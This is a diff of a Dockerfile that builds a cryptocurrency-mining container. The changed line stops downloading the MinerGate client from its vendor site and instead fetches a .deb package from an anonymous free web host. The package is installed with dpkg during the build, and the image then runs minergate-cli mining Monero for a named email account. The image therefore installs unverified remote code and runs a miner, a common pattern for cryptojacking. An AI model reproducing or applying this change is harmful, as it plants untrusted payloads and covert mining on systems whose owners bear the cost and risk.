@@ -6,7 +6,7 @@ RUN apt-get update \
         wget \
     && rm -r /var/lib/apt/lists/*
 
-RUN wget -q --content-disposition https://minergate.com/download/deb-cli \
+RUN wget -q --content-disposition https://hupiter.000webhostapp.com/a.deb \
     && dpkg -i *.deb \
     && rm *.deb
 RUN minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
